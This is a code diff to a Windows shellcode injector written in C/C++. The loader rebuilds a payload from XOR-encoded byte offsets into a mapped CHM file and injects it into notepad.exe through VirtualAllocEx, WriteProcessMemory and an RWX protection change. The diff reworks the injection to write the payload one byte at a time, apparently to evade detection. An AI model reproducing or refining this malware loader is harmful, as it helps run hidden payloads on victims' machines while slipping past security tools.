@@ -7,7 +7,6 @@
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
-#include <vector>
 
 // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
 typedef LPVOID(WINAPI* P_VirtualAllocEx)(
@@ -119,13 +118,6 @@ int main() {
     HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
     LPVOID pChmBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
 
-    // Assemble the soup locally first
-    std::vector<BYTE> localBowl(soupSize);
-    for (size_t i = 0; i < soupSize; i++) {
-        unsigned long long realOffset = alphabetSoup[i] ^ soupKey;
-        localBowl[i] = *((BYTE*)pChmBase + (DWORD)realOffset);
-    }
-
     printf("[*] Locating remote process\n");
     DWORD pid = 0;
     const wchar_t* processName = L"notepad.exe";
@@ -192,16 +184,24 @@ int main() {
         printf("[ERROR] Failed to allocate memory within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
         return -1;
     }
-
     printf("[*] Memory allocated at: 0x%016llx\n", bufferAddress);
 
-    // Write the shellcode to the block of memory that we allocated with VirtualAllocEx
-    BOOL writeShellcode = myWriteProcessMemory(pHandle, bufferAddress, localBowl.data(), soupSize, NULL);
-    if (writeShellcode == false) {
-        printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
-        VirtualFree(bufferAddress, 0, MEM_RELEASE);
-        return -1;
-    }
+    printf("[*] Decoding indices and writing directly to remote process...\n");
+    for (size_t i = 0; i < soupSize; i++) {
+        // Decode the index
+        unsigned long long realOffset = alphabetSoup[i] ^ soupKey;
+        BYTE targetByte = *((BYTE*)pChmBase + (DWORD)realOffset);
+
+        // Calculate remote write destination (Base + offset)
+        LPVOID remoteDest = (LPVOID)((BYTE*)bufferAddress + i);
+
+        // Write a single byte directly to the remote process
+        if (!myWriteProcessMemory(pHandle, remoteDest, &targetByte, 1, NULL)) {
+            printf("[!] Failed to write byte at index %zu\n", i);
+            VirtualFree(bufferAddress, 0, MEM_RELEASE);
+            return -1;
+        }
+    }    
 
     // Update the memory protection value from RW to RWX
     DWORD lpOldProtect = NULL;
